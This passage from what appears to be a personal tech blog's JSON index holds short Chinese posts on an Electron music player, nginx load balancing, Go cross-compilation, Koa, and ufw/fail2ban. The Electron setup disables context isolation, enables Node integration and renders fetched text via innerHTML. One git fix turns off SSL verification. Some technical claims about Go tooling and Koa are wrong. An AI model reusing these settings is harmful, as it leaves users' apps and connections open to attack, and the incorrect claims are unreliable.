切换到上一首歌曲prevBtn.addEventListener(&#x27;click&#x27;, () =&gt; &#123; if (currentTrackIndex &gt; 0) &#123; currentTrackIndex--; loadTrack(currentTrackIndex); &#125;&#125;);// 切换到下一首歌曲nextBtn.addEventListener(&#x27;click&#x27;, () =&gt; &#123; if (currentTrackIndex &lt; playlist.length - 1) &#123; currentTrackIndex++; loadTrack(currentTrackIndex); &#125;&#125;); 6.图片&amp;歌词123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109const audioPlayer = document.getElementById(&#x27;audioPlayer&#x27;);const songImage = document.getElementById(&#x27;songImage&#x27;);const songTitle = document.getElementById(&#x27;songTitle&#x27;);const lyricsDisplay = document.getElementById(&#x27;lyricsDisplay&#x27;);const prevBtn = document.getElementById(&#x27;prevBtn&#x27;);const nextBtn = document.getElementById(&#x27;nextBtn&#x27;);let playlist = [ &#123; name: &#x27;song1&#x27;, img: &#x27;/static/song1.jpg&#x27;, audio: &#x27;/static/song1.mp3&#x27;, lrc: &#x27;/static/song1.lrc&#x27; &#125;, &#123; name: &#x27;song2&#x27;, img: &#x27;/static/song2.jpg&#x27;, audio: &#x27;/static/song2.mp3&#x27;, lrc: &#x27;/static/song2.lrc&#x27; &#125;,];let currentTrackIndex = 0;let lyrics = [];let currentLyricIndex = 0;// 加载当前曲目的歌词文件function loadLyrics(lrcFile) &#123; fetch(lrcFile) .then(response =&gt; response.text()) .then(text =&gt; &#123; lyrics = parseLyrics(text); displayLyrics(); &#125;);&#125;// 解析歌词文件为时间戳和文本对function parseLyrics(lrcText) &#123; const lines = lrcText.split(&#x27;\\n&#x27;); const lrcData = lines.map(line =&gt; &#123; const match = line.match(/\\[(\\d&#123;2&#125;):(\\d&#123;2&#125;)(?:\\.(\\d&#123;1,3&#125;))?\\](.*)/); if (match) &#123; const minutes = parseInt(match[1]); const seconds = parseInt(match[2]); const milliseconds = match[3] ? parseInt(match[3].padEnd(3, &#x27;0&#x27;)) : 0; const time = minutes * 60 + seconds + milliseconds / 1000; return &#123; time, text: match[4].trim() &#125;; &#125; return &#123; time: 0, text: line.trim() &#125;; &#125;); return lrcData.filter(line =&gt; line.text); // 过滤掉空白行&#125;// 在页面中显示歌词function displayLyrics() &#123; lyricsDisplay.innerHTML = lyrics .map((line, index) =&gt; `&lt;p id=&quot;lyric-$&#123;index&#125;&quot;&gt;$&#123;line.text&#125;&lt;/p&gt;`) .join(&#x27;&#x27;);&#125;// 更新当前播放的歌词function updateLyrics(currentTime) &#123; for (let i = 0; i &lt; lyrics.length; i++) &#123; if (i === lyrics.length - 1 || (currentTime &gt;= lyrics[i].time &amp;&amp; currentTime &lt; lyrics[i + 1].time)) &#123; if (currentLyricIndex !== i) &#123; currentLyricIndex = i; highlightLyric(currentLyricIndex); &#125; break; &#125; &#125;&#125;// 高亮当前歌词function highlightLyric(index) &#123; const currentLyric = document.getElementById(`lyric-$&#123;index&#125;`); if (currentLyric) &#123; document.querySelectorAll(&#x27;#lyricsDisplay p&#x27;).forEach(lyric =&gt; lyric.classList.remove(&#x27;highlight&#x27;)); currentLyric.classList.add(&#x27;highlight&#x27;); lyricsDisplay.scrollTop = currentLyric.offsetTop - lyricsDisplay.offsetTop; &#125;&#125;// 加载并播放指定索引的歌曲function loadTrack(index) &#123; const track = playlist[index]; if (track) &#123; songTitle.textContent = track.name; songImage.src = track.img; audioPlayer.src = track.audio; loadLyrics(track.lrc); audioPlayer.play(); &#125;&#125;// 切换到上一首歌曲prevBtn.addEventListener(&#x27;click&#x27;, () =&gt; &#123; if (currentTrackIndex &gt; 0) &#123; currentTrackIndex--; loadTrack(currentTrackIndex); &#125;&#125;);// 切换到下一首歌曲nextBtn.addEventListener(&#x27;click&#x27;, () =&gt; &#123; if (currentTrackIndex &lt; playlist.length - 1) &#123; currentTrackIndex++; loadTrack(currentTrackIndex); &#125;&#125;);// 监听音乐播放进度，更新歌词audioPlayer.addEventListener(&#x27;timeupdate&#x27;, () =&gt; &#123; updateLyrics(audioPlayer.currentTime);&#125;);// 初始加载第一首歌曲loadTrack(currentTrackIndex); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt; M Player&lt;/title&gt; &lt;style&gt; body &#123; font-family: Arial, sans-serif; text-align: center; &#125; .player &#123; margin-top: 50px; &#125; audio &#123; width: 100%; margin-top: 20px; &#125; button &#123; margin: 5px; &#125; #songImage &#123; width: 280px; height: 280px; margin-top: 20px; &#125; #lyricsDisplay &#123; max-height: 200px; overflow-y: auto; margin-top: 20px; text-align: left; padding: 0 20px; &#125; #lyricsDisplay p &#123; margin: 5px 0; &#125; .highlight &#123; color: #ff5722; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Music Player&lt;/h1&gt; &lt;div class=&quot;player&quot;&gt; &lt;h2 id=&quot;songTitle&quot;&gt;Song Title&lt;/h2&gt; &lt;img id=&quot;songImage&quot; src=&quot;&quot; alt=&quot;Song Image&quot; /&gt; &lt;audio id=&quot;audioPlayer&quot; controls&gt;&lt;/audio&gt; &lt;br/&gt; &lt;button id=&quot;prevBtn&quot;&gt;Previous&lt;/button&gt; &lt;button id=&quot;nextBtn&quot;&gt;Next&lt;/button&gt; &lt;div id=&quot;lyricsDisplay&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;script src=&quot;renderer.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 功能说明：播放列表：通过预定义的 playlist 数组来管理歌曲信息，包括歌曲名、封面图片、音频文件路径和歌词文件路径。显示歌曲信息：播放时，会显示歌曲封面和标题，加载并解析 .lrc 文件中的歌词。歌词滚动：通过监听 audioPlayer 的 timeupdate 事件，根据当前播放的时间高亮显示对应的歌词，并自动滚动歌词区域。上一首&#x2F;下一首切换：用户可以通过按钮来切换歌曲。 7.打包Electron应用1. 安装必要的包在Electron 项目中，通常用 electron-packager 或 electron-builder 这样的工具来打包应用 1npm install electron-packager --save-dev 2. 配置 package.jsonelectron-packager: 123&quot;scripts&quot;: &#123; &quot;package-win&quot;: &quot;electron-packager . MyApp --platform=win32 --arch=x64 --icon=icon.ico&quot; &#125;, 3.run packelectron-packager: 1npm run package-win add icon 1--icon=icon.png win ​ linux ​ 4.打包linux使用 electron-packager 打包 Linux 应用与打包 Windows 或 macOS 应用类似，但需要指定不同的平台（–platform）和可能的架构（–arch）。对于 Linux，–platform 应该是 linux，而 –arch 可以是 x64（64位）或 ia32（32位），具体取决于目标系统。 以下是一个基本的示例，展示如何在 package.json 中添加一个脚本来打包 Linux 应用： 123&quot;scripts&quot;: &#123; &quot;package-linux&quot;: &quot;electron-packager . MyApp --platform=linux --arch=x64 --icon=icon.png&quot; &#125;, 注意几个要点： 平台（–platform）：这里设置为 linux。架构（–arch）：根据目标 Linux 系统，选择 x64 或 ia32。如果不确定，x64 是更常见的选择，因为大多数现代 Linux 发行版都支持 64 位应用。图标（–icon）：Linux 系统通常使用 PNG 或 SVG 格式的图标，但请注意，并非所有 Linux 桌面环境都会显示这个图标作为应用图标。有些桌面环境（如 GNOME）可能要求在应用的 .desktop 文件中指定图标。路径（.）：. 表示当前目录，即 Electron 应用的根目录。应用名称（MyApp）：这是打包后生成的文件夹的名称，也是可执行文件的名称（不带 .exe 后缀，因为这不是 Windows）。运行打包命令： 1npm run package-linux 复制到 linux授予权限~运行 打包mac~ 1&quot;package-mac&quot;: &quot;electron-packager . MyApp --platform=darwin --arch=x64&quot;, 8.载入远程data1. 使用 CommonJS 模块（适用于 Node.js 和 Electron 环境） playlist 定义在一个外部文件中，并通过 module.exports 导出它。 创建 datajson.js 文件 1234567// datajson.jsconst playlist = [ &#123; name: &#x27;song1&#x27;, img: &#x27;/static/song1.jpg&#x27;, audio: &#x27;/static/song1.mp3&#x27;, lrc: &#x27;/static/song1.lrc&#x27; &#125;, &#123; name: &#x27;song2&#x27;, img: &#x27;/static/song2.jpg&#x27;, audio: &#x27;/static/song2.mp3&#x27;, lrc: &#x27;/static/song2.lrc&#x27; &#125;,];module.exports = playlist; // 导出 playlist 变量 2: 在主文件中导入并使用 playlist然后在你的 renderer.js 文件或其他 JavaScript 文件中通过 require 引入该 playlist。 1234567// renderer.jsconst playlist = require(&#x27;./datajson.js&#x27;); // 引入 datajson.js 中的 playlistconsole.log(playlist); // 打印以验证引入的数据// 使用 playlist 进行音乐播放器的其他操作 在 Electron 的主进程中（通常是 main.js）设置 nodeIntegration 为 true，这样就可以在渲染进程中使用 Node.js 模块（包括 require）。 12345678910111213141516171819// main.jsconst &#123; app, BrowserWindow &#125; = require(&#x27;electron&#x27;);function createWindow() &#123; const win = new BrowserWindow(&#123; width: 800, height: 600, webPreferences: &#123; nodeIntegration: true, // 启用 nodeIntegration contextIsolation: false, // 禁用上下文隔离 enableRemoteModule: true // 启用 remote 模块 (可选) &#125; &#125;); win.loadFile(&#x27;index.html&#x27;);&#125;app.whenReady().then(createWindow); 9.自动播放下一首歌曲123audioPlayer.addEventListener(&#x27;ended&#x27;, () =&gt; &#123; nextBtn.click(); // 调用下一首按钮点击事件&#125;);","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"electron","slug":"electron","permalink":"https://banjinmei.github.io/tags/electron/"},{"name":"uniapp","slug":"uniapp","permalink":"https://banjinmei.github.io/tags/uniapp/"},{"name":"vue","slug":"vue","permalink":"https://banjinmei.github.io/tags/vue/"}],"author":"mu"},{"title":"nginx load balance","slug":"nginx","date":"2024-09-04T14:20:33.000Z","updated":"2024-09-04T14:26:58.000Z","comments":true,"path":"2024/09/04/nginx/","permalink":"https://banjinmei.github.io/2024/09/04/nginx/","excerpt":"","text":"Nginx Load Balance Proxy反向代理、负载均衡 1docker run --name nginx -p 8080:80 -d nginx 进入nginx容器 1Docker exec -it nginx bash nginx.conf文件nginx.conf分为http块、events块和server块,此次主要在server块中做更改. &#x2F;etc&#x2F;nginx&#x2F;nginx.conf末尾 include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;*.conf; &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;default.conf 1234567891011121314151617upstream ServiceInstance&#123; #nginx默认轮询下面的服务实例 server ***.**.***.***:9007; server ***.**.***.***:9008; server ***.**.***.***:9009;&#125; server &#123;... location / &#123; #root /usr/share/nginx/html; #index index.html index.htm; #请求到达后会进行转发 proxy_pass http://ServiceInstance; &#125; ...&#125; 浏览器中调用一个接口查看 访问不同的服务实例,负载均衡就实现了！ 也可以设置权重比例,weight值越大,请求到达此实例的次数就越多！ upstream ServiceInstance&#123; #nginx默认轮询下面的服务实例 server ***.**.***.***:9007 weight=1; server ***.**.***.***:9008 weight=2; server ***.**.***.***:9009 weight=3; &#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://banjinmei.github.io/tags/nginx/"}],"author":"mu"},{"title":"node keep backend","slug":"node-keep-backend","date":"2024-08-30T17:52:41.000Z","updated":"2024-09-20T17:35:32.371Z","comments":true,"path":"2024/08/31/node-keep-backend/","permalink":"https://banjinmei.github.io/2024/08/31/node-keep-backend/","excerpt":"","text":"在 Debian 系统上运行 Node.js 应用程序并使其保持常驻运行有几种方法 方法一：使用 systemd 服务可以创建一个 .service 文件来定义 Node.js 应用程序作为系统服务。my-node-app 1sudo nano /etc/systemd/system/my-node-app.service 编辑服务文件：在文件中添加以下内容 ： 12345678910111213[Unit]Description=My Node.js ApplicationAfter=network.target[Service]User=your-usernameWorkingDirectory=/path/to/your/appExecStart=/usr/bin/node /path/to/your/app/index.jsRestart=alwaysEnvironment=NODE_ENV=production[Install]WantedBy=multi-user.target 启动并启用服务： 12sudo systemctl start my-node-appsudo systemctl enable my-node-app 检查服务状态： 1sudo systemctl status my-node-app 方法二：使用 nohup 和 &amp;如果不想使用 systemd，可以使用 nohup 命令来保持应用程序在后台运行。 启动应用程序： 1sudo nohup node /root/nodexxx/app.js &gt; outputapp3.log 2&gt;&amp;1 &amp; 这会启动 Node.js 应用程序，并将输出和错误重定向到 app.log 文件中。 查看后台进程： 1ps aux | grep node 停止应用程序： 1pkill -f node 方法三：使用 screen 或 tmux终端复用工具，可以使用 screen 或 tmux。 安装 screen（如果尚未安装）：1sudo apt-get install screen 创建一个新的 screen 会话： 1screen -S my-node-app 在 screen 中启动应用程序： 1node /path/to/your/app/index.js 分离 screen 会话：按下 Ctrl+A，然后按下 D。 重新附加到 screen 会话： 1screen -r my-node-app 安装 tmux（如果未安装）1sudo apt-get install tmux 启动一个 tmux 会话： 1tmux new -s my_node_app 在里面运行 Node.js 应用程序： 1node your_app.js 按下 Ctrl+B，然后按 D 键分离 tmux。可以随时重新连接到这个会话： 1tmux attach -t my_node_app","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"node","slug":"node","permalink":"https://banjinmei.github.io/tags/node/"}],"author":"mu"},{"title":"win bilud go 4 linux","slug":"win-bilud-go-4-linux","date":"2024-08-25T16:58:39.000Z","updated":"2024-12-07T18:17:32.477Z","comments":true,"path":"2024/08/26/win-bilud-go-4-linux/","permalink":"https://banjinmei.github.io/2024/08/26/win-bilud-go-4-linux/","excerpt":"","text":"1. 安装必要的工具和依赖首先，确保你已经安装了Go编译器和VS Code。如果还没有安装Go，可以从官方网站下载并安装。 2. 配置Go环境打开VS Code，按 Ctrl + Shift + P 打开命令面板，输入 “shell” 选择 “Shell: Windows” 或 “Shell: Linux” 创建一个新的Go项目 在VS Code中创建一个新的文件夹作为你的Go项目目录，然后在终端中导航到该目录并初始化一个新的Go项目： 12345mkdir my-go-appcd my-go-appgo mod init my-go-apptouch main.go 4. 编写Go程序在 main.go 文件中编写一个简单的Hello World程序： 12345678package mainimport &quot;fmt&quot;func main() &#123; fmt.Println(&quot;Hello, World!&quot;)&#125; 5. 安装交叉编译工具 ⭐Go提供了一些工具来进行跨平台编译。你可以使用以下命令来安装这些工具： 123go install github.com/golang/tools/cmd/goimports@latestgo install golang.org/x/lint/golint@latestgo install github.com/cweill/gotests/...@latest 6. 配置VS Code以使用Linux环境你需要一个Linux环境来进行交叉编译。Windows Subsystem for Linux (WSL)来实现。(https://learn.microsoft.com/zh-cn/windows/wsl/install?source=recommendations) 1wsl --install 扩展 Remoto Development 左侧会出现Remote Explorer Tab，在这个tab下可以切换wsl target + 在VS Code中，打开终端，然后选择“WSL: Ubuntu”或其他安装的Linux发行版。 7. 编译成Linux可执行程序在终端中运行以下命令来编译你的Go程序： 1CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o my-go-app-linux main.go 这里的 CGO_ENABLED&#x3D;0 是必要的，因为默认情况下Go会使用cgo来进行一些系统调用，而Linux并不支持这些调用。 1234go build -o YourProgramName -ldflags &quot;-s -w&quot; --buildmode=exe -o out/linux/YourProgramName main.gogo build -o Fs -ldflags &quot;-s -w&quot; --buildmode=exe main.go ubuntu go lang setup123wget https://go.dev/dl/go1.17.3.linux-amd64.tar.gz(SUDO) tar -C /usr/local -xzf go1.17.3.linux-amd64.tar.gz 8. 测试你的可执行程序编译完成后，你可以运行以下命令来检查生成的可执行文件： 1./my-go-app-linux “Hello, World!” 9. 打包和分发（可选）Go程序打包并分发到Linux服务器上，可以使用tar或scp等工具来传输文件 12tar -czvf my-go-app-linux.tar.gz my-go-app-linuxscp my-go-app-linux.tar.gz user@remote-server:/path/to/destination 切换win&#x2F;linux打包window下如何打包成exe文件，并运行。 打开goland，点击Terminal 终端 输入指令： 1go env 查看 GOOS是否windows windows执行指令： 1go env -w GOOS=windows 接下来运行 1go build main.go 发现项目目录多了一个 main.exe的文件，这个就是根据项目生成的 exe文件。 window下如何执行 main.exe 呢？打开 cmd 命令行 进入到 main.exe 所在的目录，输入 main.exe 即可 看到已经输出了 hello ! linux执行指令修改为linux： 1go env -w GOOS=linux 接下来运行 1go build main.go 发现项目目录多了一个 main的文件，这个就是根据项目生成的 linux下的可执行文件 那么如何在linux下执行 main 呢？ 将main上传到 linux系统的 &#x2F;home目录。 确保已经安装上go环境，使用 go version 看一下 能够输出，说明已经安装好了go 为main添加可执行权限 1chmod +x main 执行main程序： 1./main 可以看到输出 hello !","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"},{"name":"go","slug":"go","permalink":"https://banjinmei.github.io/tags/go/"},{"name":"linux","slug":"linux","permalink":"https://banjinmei.github.io/tags/linux/"}],"author":"mu"},{"title":"Anolis8.4 .NET","slug":"Anolis8-4-NET","date":"2024-08-25T02:03:23.000Z","updated":"2024-12-09T15:25:01.475Z","comments":true,"path":"2024/08/25/Anolis8-4-NET/","permalink":"https://banjinmei.github.io/2024/08/25/Anolis8-4-NET/","excerpt":"","text":"Anolis8.4 包管理器为 yum。 打开终端或命令提示符窗口，并切换到 root 用户。 添加 Microsoft 包源。 12wget https://packages.microsoft.com/config/centos/8/packages-microsoft-prod.repo -O /etc/yum.repos.d/packages-microsoft-prod.repo 安装.NET 8 SDK。 1sudo yum install dotnet-sdk-8.0 运行时 1sudo yum install dotnet-runtime-8.0 安装完成后，可以通过以下命令验证.NET 8 是否已成功安装。 1dotnet --version test 123dotnet new console -o HelloWorldcd HelloWorlddotnet run","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"anolis","slug":"anolis","permalink":"https://banjinmei.github.io/tags/anolis/"}],"author":"mu"},{"title":"node koa","slug":"node-koa","date":"2024-08-19T15:57:00.000Z","updated":"2024-08-19T16:00:34.000Z","comments":true,"path":"2024/08/19/node-koa/","permalink":"https://banjinmei.github.io/2024/08/19/node-koa/","excerpt":"","text":"koaKoa 是一个由 Express 原班人马打造的新的 Web 框架，旨在提供更小、更富表现力、更健壮的服务器处理逻辑。它使用 ES6 的新特性，如 Promises 和 generators，来简化异步流程控制。以下是一些关于 Koa 的关键点： 特点轻量级：Koa 的核心代码非常精简，没有捆绑很多中间件，这使得它的启动速度快、体积小。 简洁的中间件系统：Koa 使用基于 Promise 的中间件模型，这个模型允许你通过 async&#x2F;await 来编写异步代码，并且可以方便地在中间件之间共享逻辑。 **强大的上下文对象 (Context)**：每个请求都有一个 context 对象，它包含了 request 和 response 的所有信息，简化了处理 HTTP 消息的流程。 错误处理：Koa 通过统一的错误处理机制来简化错误处理过程，你可以在任何地方抛出错误，并在应用的顶层捕获它们。 内置支持 async&#x2F;await：由于 Koa 基于 ES6 的新特性，所有的处理函数默认都是异步的，你可以使用 async&#x2F;await 来编写更简洁和直观的代码。 123nvm install 7npm i koanode my-koa-app.js 123456789101112131415161718192021222324const Koa = require(&#x27;koa&#x27;);const app = new Koa();// loggerapp.use(async (ctx, next) =&gt; &#123; await next(); // 调用下一个中间件 const rt = ctx.response.get(&#x27;X-Response-Time&#x27;); console.log(`$&#123;ctx.method&#125; $&#123;ctx.url&#125; - $&#123;rt&#125;`);&#125;);// x-response-timeapp.use(async (ctx, next) =&gt; &#123; const start = Date.now(); await next(); // 调用下一个中间件 const ms = Date.now() - start; ctx.set(&#x27;X-Response-Time&#x27;, `$&#123;ms&#125;ms`);&#125;);// responseapp.use(async ctx =&gt; &#123; ctx.body = &#x27;Hello World&#x27;;&#125;);app.listen(3000); 在这个示例中，我们定义了两个中间件来记录请求的时间和日志。ctx 对象包含了所有的 HTTP 请求信息，你可以通过它访问 request 和 response。 路由Koa 本身不包含内置的路由系统，但是可以通过第三方中间件如 koa-router 来实现灵活的路由功能。 1234567891011121314151617181920//npm i koa-routerconst Koa = require(&#x27;koa&#x27;);const Router = require(&#x27;koa-router&#x27;);const app = new Koa();const router = new Router();router.get(&#x27;/&#x27;, (ctx, next) =&gt; &#123; ctx.body = &#x27;Hello World&#x27;;&#125;);router.get(&#x27;/users/:id&#x27;, (ctx, next) =&gt; &#123; const id = ctx.params.id; ctx.body = `User ID: $&#123;id&#125;`;&#125;);app.use(router.routes()).use(router.allowedMethods());app.listen(3011); http://localhost:3011/http://localhost:3011/users/1 err code: ‘MODULE_NOT_FOUND’delete node_modules 12npm i 中间件Koa 的强大之处在于其灵活的中间件系统。通过编写自定义的中间件来处理请求和响应，甚至可以修改 ctx 对象 1234567891011121314151617181920212223const Koa = require(&#x27;koa&#x27;);const app = new Koa();app.use(async (ctx, next) =&gt; &#123; console.log(&#x27;First middleware start&#x27;); await next(); // 调用下一个中间件 console.log(&#x27;First middleware end&#x27;);&#125;);app.use(async (ctx, next) =&gt; &#123; console.log(&#x27;Second middleware start&#x27;); ctx.state.user = &#123; name: &#x27;John Doe&#x27; &#125;; // 设置一些状态 await next(); // 调用下一个中间件 console.log(&#x27;Second middleware end&#x27;);&#125;);app.use(async (ctx) =&gt; &#123; console.log(&#x27;Third middleware start&#x27;); ctx.body = `Hello, $&#123;ctx.state.user.name&#125;`; console.log(&#x27;Third middleware end&#x27;);&#125;);app.listen(3012); koa-compose 进行中间件组合Koa 提供了一个内置的方法 koa-compose 来将多个中间件组合成一个中间件函数。这使得管理复杂的中间件堆栈变得更加容易。 12345678910111213141516171819202122232425262728const Koa = require(&#x27;koa&#x27;);const compose = require(&#x27;koa-compose&#x27;);const app = new Koa();const middleware1 = async (ctx, next) =&gt; &#123; console.log(&#x27;Middleware 1 start&#x27;); await next(); console.log(&#x27;Middleware 1 end&#x27;);&#125;;const middleware2 = async (ctx, next) =&gt; &#123; console.log(&#x27;Middleware 2 start&#x27;); ctx.state.user = &#123; name: &#x27; koacom &#x27; &#125;; await next(); console.log(&#x27;Middleware 2 end&#x27;);&#125;;const middleware3 = async (ctx) =&gt; &#123; console.log(&#x27;Middleware 3 start&#x27;); ctx.body = `Hello, $&#123;ctx.state.user.name&#125;`; console.log(&#x27;Middleware 3 end&#x27;);&#125;;const allMiddlewares = compose([middleware1, middleware2, middleware3]);app.use(allMiddlewares);app.listen(3020); koa-bodyparserkoa-statickoa-loggerkoa-session Koa 是一个现代的、高效能的 Web 框架，它利用最新的 JavaScript 特性来简化异步编程和中间件逻辑。它的轻量级设计让它非常适合构建小型到中型的应用。如果你正在寻找一个更简洁、高效的 Node.js Web 框架，Koa 绝对值得一试。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"node","slug":"node","permalink":"https://banjinmei.github.io/tags/node/"},{"name":"koa","slug":"koa","permalink":"https://banjinmei.github.io/tags/koa/"}],"author":"mu"},{"title":"aliyun RabbitMQ","slug":"aliyun-RabbitMQ","date":"2024-08-18T04:48:20.000Z","updated":"2024-08-18T10:01:34.000Z","comments":true,"path":"2024/08/18/aliyun-RabbitMQ/","permalink":"https://banjinmei.github.io/2024/08/18/aliyun-RabbitMQ/","excerpt":"","text":"云消息队列RabbitMQ版和开源版本的区别和优势云消息队列 RabbitMQ 版是一款基于高可用分布式存储架构实现的 AMQP 0-9-1 协议的消息产品，能够兼容开源 RabbitMQ 客户端。与开源 RabbitMQ 相比，能够解决各种稳定性痛点（例如消息堆积、脑裂等问题），同时具备高并发、分布式、灵活扩缩容等云消息服务优势。 云消息队列RabbitMQ版Serverless系列实例云消息队列 RabbitMQ 版 Serverless 系列实例能力和预付费系列的企业版能力一样，但 Serverless 系列实例具有更高的弹性上限，且是按量后付费的计费方式，无需提前预留资源，按照实际使用量收费，降本增效。 AccessKey AccessKey添加 Vhost添加 Exchange添加 Queue Exchange绑定queue 导入项目到ideaIUamqp-java-demo &gt; src &gt; main &gt; java，双击Config.java文件，将代码中HOSTNAME、USERNAME、PASSWORD三个参数值替换为阿里云RabbitMQ实例的公网接入点、静态用户名和静态密码。 ProducerTest.java持续发送消息。看到控制台[SendResult] Message with msgId: ba42ffcb-ff05-422e-9e9f-37cdd8f2c9b0 has been ack-ed, deliveryTag: 1, multiple: false ConsumerTest.java持续接收消息。 观察IntelliJ IDEA控制台打印的消息收发记录。[ReceiveResult] Message Received successfully, messageId: fad269f2-a09d-441b-b74c-426c15fbbb17, consumerTag: yunQi-consumerTag, message: 消息Body-29 查看Dashboard的实例指标变化可以查看指定Queue的详细指标变化趋势，用于定位问题。 消息轨迹轨迹详情，查询对应消息的生产和投递轨迹详情。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"rabbitmq","slug":"rabbitmq","permalink":"https://banjinmei.github.io/tags/rabbitmq/"}],"author":"mu"},{"title":"debian ufw","slug":"debian-ufw","date":"2024-08-18T04:44:31.000Z","updated":"2024-12-02T17:19:38.063Z","comments":true,"path":"2024/08/18/debian-ufw/","permalink":"https://banjinmei.github.io/2024/08/18/debian-ufw/","excerpt":"","text":"安装ufw12sudo apt updatesudo apt install ufw #开启防火墙 1sudo ufw enable #关闭防火墙 123456789101112131415ufw disableufw status verboseufw status numberedsudo ufw status #查看状态sudo ufw disable #关闭sudo ufw enble #开启sudo ufw allow 8000/tcp #添加规则，允许所有ip访问8000端口sudo ufw deny 8000/tcp #添加或者修改规则，禁止访问8000端口sudo ufw delete 8000/tcp #删除该规则 恢复默认策略：123ufw default deny incoming ufw default allow outgoing ufw default reject routed 重置UFW（将删除所有自定义策略并关闭UFW） 1ufw reset 添加允许连接的商端口： 1ufw allow [port] 放行指定范围的端口： 12ufw allow 10010:10086/tcpufw allow 10010:10086/udp 允许指定ip访问 1234567# 放行ipufw allow 221.123.1.1ufw allow 221.123.1.1 to any port 22# 放行ip段ufw allow 221.123.1.0/24ufw allow 221.123.1.0/24 to any port 22 拒绝连接 12ufw deny httpufw deny from 221.123.1.1 删除规则 1234567# 按编号删除ufw delete [num]# 按实际规则删除ufw delete allow http # or ufw delete allow 80 fail2ban在 Debian 系统上，可以通过配置 fail2ban 来实现监控 SSH 登录（默认端口为 22），并在密码输错5次时封禁对应的 IP。以下是详细步骤： 1. 安装 fail2ban12sudo apt updatesudo apt install fail2ban -y 2. 配置 fail2ban创建自定义配置文件默认配置文件位于 &#x2F;etc&#x2F;fail2ban&#x2F;jail.conf，但我们不直接修改它，而是创建一个覆盖配置文件： 1sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local 编辑 jail.local使用喜欢的文本编辑器打开文件： 1sudo nano /etc/fail2ban/jail.local 找到 [sshd] 部分（如果没有，添加），并修改如下： 12345678[sshd]enabled = true # 启用此规则port = 22 # 监控端口filter = sshd # 使用默认 sshd 过滤规则logpath = /var/log/auth.log # SSH 登录的日志文件路径（Debian 默认）bantime = 3600 # 封禁时间，单位为秒（此处为 1 小时）findtime = 600 # 计数时间窗口，单位为秒（此处为 10 分钟）maxretry = 5 # 最大重试次数 3. 检查 fail2ban 配置确保 fail2ban 配置语法正确： 1sudo fail2ban-client -t 如果一切正常，会显示类似 OK 的输出。 4. 启动并启用 fail2ban12sudo systemctl start fail2bansudo systemctl enable fail2ban 5. 验证设置是否生效检查运行状态 1sudo fail2ban-client status 输出中应包括 sshd 监控规则。 查看被封禁的 IP如果触发了规则，可以通过以下命令查看当前被封禁的 IP： 1sudo fail2ban-client status sshd 手动测试从另一个设备或终端尝试多次输入错误的 SSH 密码。观察 IP 是否被封禁。可以通过以下命令解封被封禁的 IP： 1sudo fail2ban-client unban IP_ADDRESS 6. 可选优化修改默认封禁动作fail2ban 默认封禁 IP 是通过修改 iptables 规则实现的。如果需要使用其他封禁机制，可以修改 [sshd] 部分的 action 参数。例如，发送邮件通知等。 通过以上步骤，的 Debian 系统会监控 22 端口登录尝试，并在密码错误超过 5 次时自动封禁 IP。 1bantime = -1 # 设置永久封禁","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"}],"author":"mu"},{"title":"git 443 couldt connect","slug":"git-443-couldt-connect","date":"2024-08-18T03:59:27.000Z","updated":"2024-08-25T17:28:10.000Z","comments":true,"path":"2024/08/18/git-443-couldt-connect/","permalink":"https://banjinmei.github.io/2024/08/18/git-443-couldt-connect/","excerpt":"","text":"Git Err unable to access ‘https://github.com/…’: Failed to connect to github.com port 443 after 21096 ms: Couldn’t connect to server err OpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to github.com:443 重置git代理检查是否开了网络代理，如果有先关闭在命令行输入如下命令 1234git config --global --unset http.proxygit config --global --unset https.proxy 找到本机代理端口号 123git config --global http.proxy http://127.0.0.1:端口号git config --global https.proxy http://127.0.0.1:端口号 git config –global http.sslVerify false","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"git","slug":"git","permalink":"https://banjinmei.github.io/tags/git/"}],"author":"mu"},{"title":"Docker mssql","slug":"Docker-mssql","date":"2024-08-18T03:08:56.000Z","updated":"2024-08-18T03:48:32.000Z","comments":true,"path":"2024/08/18/Docker-mssql/","permalink":"https://banjinmei.github.io/2024/08/18/Docker-mssql/","excerpt":"","text":"创建容器1docker run -e &quot;ACCEPT_EULA=Y&quot; -e 